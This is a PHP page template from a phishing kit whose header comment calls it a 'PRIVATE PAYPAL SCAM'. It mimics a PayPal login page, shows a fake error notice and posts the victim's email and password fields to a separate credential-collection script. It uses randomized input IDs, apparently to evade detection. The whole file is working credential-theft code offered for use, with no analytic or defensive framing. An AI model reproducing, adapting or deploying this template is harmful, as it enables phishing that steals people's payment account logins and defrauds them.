<?php
session_start();

@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
/*

+----------------------------------+
�--- PRIVATE PAYPAL SCAM 2015 -----�
�---------- Ver : 2.0 -------------�
�--------- HaMza-x Ben  -----------�
�----------- GREETZ TO ------------�
�--- Dz Phoniex : Dz Injector -----�
�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/


date_default_timezone_set('GMT');
$copyright = date("Y");
include "../lang".$_SESSION['DZLN'];

?>




<!DOCTYPE html>
<html lang="en" class=" js ">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8"><title>  <?php echo $titlerr ?> <?php echo $_SESSION['DZNCOUNT']; ?> </title>

<link rel="shortcut icon" href="dzn_favicon_x.ico">
<script src="modernizr-2.6.1.js"></script><script>if (self === top) {var antiClickjack = document.getElementById("antiClickjack");antiClickjack.parentNode.removeChild(antiClickjack);} else {top.location = self.location;}</script><script src="config.js" data-requiremodule="config" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="app.js" data-requiremodule="app" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="login.js" data-requiremodule="view/login" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="err.css" media="all">
</head>
<body class="desktop" >
<noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the <img src="../dznoob1.png"> Web site require Javascript and cookies.</p></noscript>
<div id="page"><div id="content" class="contentContainer"><header><div class="dznoob-logo"></div></header><div id="main" role="main">
<section id="login" data-role="page" data-title="DZN"><div id="notifications"><p class="notification notification-critical" role="alert"> <?php echo $wrong ?> </p></div><h1 class="headerText accessAid">Log in to your <img src="../dznoob1.png"> account</h1>

<form action="../logcheck.php" method="post" name="login">
<div class="modal-overlay hide"></div>
<div id="passwordSection" class="clearfix">
<div class="textInput fieldempty" id="emaildiv"><div class="fieldWrapper">
<label for="email" class="fieldLabel"> <?php echo $login_email_input_0; ?> </label>
<input id=" <?php
echo rand(100, 99999999);
?> " name="EM" class="hasHelp validate" required="required"  autocomplete="off" placeholder=" <?php echo $login_email_input_0; ?> " type="email"></div>
</div><div class="textInput" id="passworddiv">
<div class="fieldWrapper"><label for="password" class="fieldLabel"> <?php echo $login_password_input_0; ?> </label>
<input id=" <?php
echo rand(100, 99999999);
?> " name="PS" class="hasHelp validate" required="required" placeholder=" <?php echo $login_password_input_0; ?> " type="password"></div>
</div></div><div class="actions">
<button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value=" <?php echo $login_button_a_0; ?> "> <?php echo $login_button_a_0; ?> </button></div>

<p class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password"> <?php echo $passwordRecovery1_a_0; ?> </a></p><p></p></form>

<a href="#" class="button secondary" id="createAccount"> 
<?php echo $signup_button_a_0; ?> </a>
</section>
</div><div class="modal-animate hide"><div class="rotate"></div></div></div>
<center> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;


<a href="changelang.html"><img height=2% width=2% src=http://api.hostip.info/images/flags/<?php echo strtolower($_SESSION['DZNCOUNTCODE']); ?>.gif>    <?php echo $_SESSION['DZNCOUNTCODE']; ?> </center> </a>

</div>
<footer class="footer clearfix" role="contentinfo"><ul><li><a href="#"> <?php echo $footer_footer_secondary_secondaryLink_li[0]; ?> <img src="../dznoob1.png"></a></li>
<li><a href="#"> <?php echo $footer_footer_main_secondaryLink_li[1]; ?> </a></li>
<li><a href="#"> <?php echo $footer_footer_main_secondaryLink_li[2]; ?> </a></li>
<li><a href="#l"> <?php echo $footer_footer_tertiary_secondaryLink_li[1]; ?> </a></li>
<li><a href="#"> <?php echo $footer_footer_tertiary_secondaryLink_li[2]; ?> </a></li>
</ul><ul><li><a href="#"> <?php echo $footer_footer_main_secondaryLink_li[4]; ?> </a></li>
<li><a href="#">  <?php echo $footer_footer_secondary_secondaryLink_li[1]; ?> </a></li>
<li><a href="#"> <?php echo $footer_footer_secondary_secondaryLink_li[2]; ?> </a></li>
<li><a href="#"> <?php echo $footer_footer_secondary_secondaryLink_li[5]; ?> </a></li>
<li><a href="#"> <?php echo $footer_footer_secondary_secondaryLink_li[3]; ?> </a></li>
<li><a href="#"> <?php echo $footer_footer_secondary_secondaryLink_li[4]; ?> </a></li></ul><p id="legal"> <?php echo $copy1; ?>  <img src="../dznoob1.png">. <?php echo $copy2; ?> .</p></footer>

</html>
